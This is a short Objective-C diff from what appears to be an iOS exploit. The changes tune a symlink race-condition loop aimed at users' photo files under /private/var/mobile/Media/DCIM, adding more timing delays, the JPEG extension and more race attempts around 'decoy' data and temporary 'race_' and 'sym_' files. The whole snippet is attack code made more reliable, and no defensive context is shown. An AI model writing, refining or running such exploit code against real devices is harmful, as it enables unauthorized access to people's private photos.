@@ -560,8 +560,8 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
            decoy:(NSData *)decoyData
            total:(int *)scannedTotal
 {
-    NSArray<NSNumber *> *delays = @[@0, @10, @20, @30, @50];
-    NSArray<NSString *> *exts = @[@"HEIC", @"JPG", @"PNG"];
+    NSArray<NSNumber *> *delays = @[@0, @5, @10, @20, @30, @50, @80, @120];
+    NSArray<NSString *> *exts = @[@"HEIC", @"JPG", @"PNG", @"JPEG"];
     __block int hits = 0;
     dispatch_semaphore_t limit = dispatch_semaphore_create(8);
     dispatch_group_t group = dispatch_group_create();
@@ -571,7 +571,7 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
         dispatch_semaphore_wait(limit, DISPATCH_TIME_FOREVER);
         dispatch_group_async(group, q, ^{
             int img = start + j;
-            for (int e = 0; e < 3; e++) {
+            for (int e = 0; e < 4; e++) {
                 NSString *ext = exts[(NSUInteger)e];
                 NSString *target = [NSString stringWithFormat:
                     @"/private/var/mobile/Media/DCIM/%dAPPLE/IMG_%04d.%@",
@@ -580,7 +580,7 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
                     [NSString stringWithFormat:@"race_%d_%d_%d.%@", folder, img, e, ext]];
                 NSString *symPath = [tmp stringByAppendingPathComponent:
                     [NSString stringWithFormat:@"sym_%d_%d_%d.%@", folder, img, e, ext]];
-                for (int a = 0; a < 5; a++) {
+                for (int a = 0; a < 8; a++) {
                     if (scannedTotal) {
                         @synchronized (self) { (*scannedTotal)++; }
                     }
